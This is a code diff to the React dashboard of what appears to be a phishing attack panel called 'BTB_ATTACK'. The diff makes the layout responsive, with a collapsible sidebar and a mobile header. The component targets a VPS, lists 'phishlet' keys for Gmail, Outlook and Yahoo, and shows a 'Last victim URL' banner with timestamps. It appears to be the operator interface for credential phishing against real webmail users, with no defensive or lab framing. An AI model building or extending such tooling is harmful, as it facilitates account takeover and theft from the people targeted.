@@ -6,13 +6,14 @@ import useAsyncAction from '../hooks/useAsyncAction'
 
 const VPS_IP = import.meta.env.VITE_VPS_IP || '127.0.0.1'
 const BASE = import.meta.env.VITE_API_URL || ''
+const APP_NAME = import.meta.env.VITE_APP_NAME || 'BTB_ATTACK'
 
 function authHeaders() {
   const token = localStorage.getItem('btb_token')
   return token ? { Authorization: `Bearer ${token}` } : {}
 }
 
-const PHISHLET_KEYS = ['gmail', 'outlook', 'facebook', 'instagram']
+const PHISHLET_KEYS = ['gmail', 'outlook', 'yahoo']
 
 function timeAgo(iso) {
   if (!iso) return ''
@@ -30,6 +31,7 @@ export default function Dashboard() {
   const [activeTabId, setActiveTabId] = useState(null)
   const [iframeError, setIframeError] = useState(false)
   const [lastVisit, setLastVisit] = useState(null)
+  const [sidebarOpen, setSidebarOpen] = useState(false)
   const iframeRef = useRef(null)
 
   useEffect(() => {
@@ -64,6 +66,7 @@ export default function Dashboard() {
   }, [])
 
   function addTab(url, label) {
+    setSidebarOpen(false)
     const existing = tabs.find((t) => t.url === url)
     if (existing) {
       setActiveTabId(existing.id)
@@ -97,100 +100,131 @@ export default function Dashboard() {
 
   return (
     <div className="min-h-screen bg-gray-950 flex">
-      <Sidebar
-        onRun={run}
-        loading={loading}
-        onOpenBrowser={addTab}
-      />
+      {sidebarOpen && (
+        <div
+          className="fixed inset-0 bg-black/50 z-40 lg:hidden"
+          onClick={() => setSidebarOpen(false)}
+        />
+      )}
 
-      <main className="flex-1 flex flex-col p-6 overflow-hidden">
-        <div className="text-xs text-gray-600 mb-4">
-          target: <span className="text-green-500">{VPS_IP}</span>
+      <div className={`
+        fixed lg:static inset-y-0 left-0 z-50
+        transform transition-transform duration-200 ease-in-out
+        ${sidebarOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0'}
+      `}>
+        <Sidebar
+          onRun={run}
+          loading={loading}
+          onOpenBrowser={addTab}
+          onClose={() => setSidebarOpen(false)}
+        />
+      </div>
+
+      <main className="flex-1 flex flex-col min-w-0">
+        <div className="lg:hidden flex items-center gap-3 px-4 py-3 border-b border-gray-800">
+          <button
+            onClick={() => setSidebarOpen(true)}
+            className="text-gray-400 hover:text-green-400 transition p-1"
+          >
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+          </button>
+          <span className="text-sm font-bold text-green-400 tracking-widest">{APP_NAME}</span>
         </div>
 
-        {lastVisit && lastVisit.timestamp && (Date.now() - new Date(lastVisit.timestamp).getTime() < 5 * 60 * 1000) && (
-          <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
-            <span className="text-green-400">🟢</span>
-            <span className="text-gray-400">Last victim URL:</span>
-            <span className="text-green-300 font-mono truncate max-w-[60%]">
-              {lastVisit.current_url}
-            </span>
-            <span className="text-gray-500">
-              ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
-            </span>
+        <div className="flex-1 p-3 sm:p-4 lg:p-6 overflow-y-auto">
+          <div className="text-xs text-gray-600 mb-4">
+            target: <span className="text-green-500">{VPS_IP}</span>
           </div>
-        )}
 
-        <TerminalOutput logs={logs} onClear={clearLogs} />
-
-        {tabs.length > 0 && (
-          <div className="mt-4 border border-gray-800 rounded-lg overflow-hidden flex-1 flex flex-col">
-            <div className="bg-gray-900 border-b border-gray-800 shrink-0 flex">
-              {tabs.map((tab) => (
-                <div
-                  key={tab.id}
-                  onClick={() => { setActiveTabId(tab.id); setIframeError(false) }}
-                  className={`flex items-center gap-1.5 px-3 py-2 text-xs cursor-pointer border-r border-gray-800 transition ${
-                    tab.id === activeTabId
-                      ? 'bg-gray-800 text-green-300'
-                      : 'text-gray-500 hover:text-gray-300 hover:bg-gray-850'
-                  }`}
-                >
-                  <span>{tab.label}</span>
-                  <button
-                    onClick={(e) => { e.stopPropagation(); closeTab(tab.id) }}
-                    className="text-gray-600 hover:text-red-400 ml-1 leading-none"
-                  >
-                    ×
-                  </button>
-                </div>
-              ))}
-              <a
-                href={activeTab?.url}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="ml-auto px-3 py-2 text-xs text-blue-400 hover:text-blue-300 underline shrink-0"
-              >
-                open in new tab
-              </a>
-              <button
-                onClick={() => { setTabs([]); setActiveTabId(null) }}
-                className="px-3 py-2 text-xs text-gray-500 hover:text-red-400 transition shrink-0"
-                title="Close browser"
-              >
-                ×
-              </button>
+          {lastVisit && lastVisit.timestamp && (Date.now() - new Date(lastVisit.timestamp).getTime() < 5 * 60 * 1000) && (
+            <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
+              <span className="text-green-400">🟢</span>
+              <span className="text-gray-400">Last victim URL:</span>
+              <span className="text-green-300 font-mono truncate max-w-[60%]">
+                {lastVisit.current_url}
+              </span>
+              <span className="text-gray-500 hidden sm:inline">
+                ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
+              </span>
+              <span className="text-gray-500 sm:hidden">
+                ({timeAgo(lastVisit.timestamp)})
+              </span>
             </div>
+          )}
 
-            {iframeError ? (
-              <div className="flex-1 flex items-center justify-center bg-gray-950 min-h-[400px]">
-                <div className="text-center">
-                  <p className="text-red-400 text-sm mb-2">Could not connect to {activeTab?.url}</p>
-                  <p className="text-gray-500 text-xs mb-4">
-                    Make sure the container is running and port is open on the VPS.
-                  </p>
-                  <a
-                    href={activeTab?.url}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="text-blue-400 hover:text-blue-300 underline text-sm"
+          <TerminalOutput logs={logs} onClear={clearLogs} />
+
+          {tabs.length > 0 && (
+            <div className="mt-4 border border-gray-800 rounded-lg overflow-hidden flex-1 flex flex-col">
+              <div className="bg-gray-900 border-b border-gray-800 shrink-0 flex overflow-x-auto">
+                {tabs.map((tab) => (
+                  <div
+                    key={tab.id}
+                    onClick={() => { setActiveTabId(tab.id); setIframeError(false) }}
+                    className={`flex items-center gap-1.5 px-3 py-2 text-xs cursor-pointer border-r border-gray-800 transition whitespace-nowrap shrink-0 ${
+                      tab.id === activeTabId
+                        ? 'bg-gray-800 text-green-300'
+                        : 'text-gray-500 hover:text-gray-300 hover:bg-gray-850'
+                    }`}
                   >
-                    open in new tab instead
-                  </a>
-                </div>
+                    <span>{tab.label}</span>
+                    <button
+                      onClick={(e) => { e.stopPropagation(); closeTab(tab.id) }}
+                      className="text-gray-600 hover:text-red-400 ml-1 leading-none"
+                    >
+                      ×
+                    </button>
+                  </div>
+                ))}
+                <a
+                  href={activeTab?.url}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="ml-auto px-3 py-2 text-xs text-blue-400 hover:text-blue-300 underline shrink-0 hidden sm:block"
+                >
+                  open in new tab
+                </a>
+                <button
+                  onClick={() => { setTabs([]); setActiveTabId(null) }}
+                  className="px-3 py-2 text-xs text-gray-500 hover:text-red-400 transition shrink-0"
+                  title="Close browser"
+                >
+                  ×
+                </button>
               </div>
-            ) : (
-              <iframe
-                key={activeTabId}
-                ref={iframeRef}
-                src={activeTab?.url}
-                className="w-full flex-1 min-h-[400px] bg-black"
-                title={activeTab?.label}
-                onError={() => setIframeError(true)}
-              />
-            )}
-          </div>
-        )}
+
+              {iframeError ? (
+                <div className="flex-1 flex items-center justify-center bg-gray-950 min-h-[300px] sm:min-h-[400px]">
+                  <div className="text-center px-4">
+                    <p className="text-red-400 text-sm mb-2">Could not connect to {activeTab?.url}</p>
+                    <p className="text-gray-500 text-xs mb-4">
+                      Make sure the container is running and port is open on the VPS.
+                    </p>
+                    <a
+                      href={activeTab?.url}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-blue-400 hover:text-blue-300 underline text-sm"
+                    >
+                      open in new tab instead
+                    </a>
+                  </div>
+                </div>
+              ) : (
+                <iframe
+                  key={activeTabId}
+                  ref={iframeRef}
+                  src={activeTab?.url}
+                  className="w-full flex-1 min-h-[300px] sm:min-h-[400px] bg-black"
+                  title={activeTab?.label}
+                  onError={() => setIframeError(true)}
+                />
+              )}
+            </div>
+          )}
+        </div>
       </main>
     </div>
   )
